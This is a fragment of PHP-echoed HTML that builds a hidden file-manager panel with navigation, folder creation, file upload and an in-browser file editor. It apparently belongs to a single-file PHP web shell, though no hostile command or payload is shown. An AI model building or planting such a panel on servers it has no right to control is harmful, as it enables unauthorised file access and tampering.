<div id="p_fm" style="display:none"><div class="cd"><div class="fm-bar"><button class="bt b-b" onclick="fmUp()">Up</button><button class="bt b-h" onclick="fmRefresh()">Refresh</button><button class="bt b-o" onclick="fmNewDir()">New Folder</button><input type="file" id="fmFile" style="display:none" onchange="fmUpload()"><button class="bt b-g" onclick="document.getElementById(\'fmFile\').click()">Upload</button></div><div class="fm-path"><span>Path:</span><input id="fmPath" value="'.htmlspecialchars($cw).'" onkeydown="if(event.key===\'Enter\')fmGo(this.value)"></div><div class="fm-list" id="fmList"></div></div><div class="cd" id="fmEditor" style="display:none"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><span id="fmEditPath" style="font-family:monospace;font-size:11px;color:#1abc9c"></span><div style="display:flex;gap:4px"><button class="bt b-g" onclick="fmSave()">Save</button><button class="bt b-h" onclick="fmCloseEditor()">Close</button></div></div><textarea class="editor" id="fmContent"></textarea></div></div>
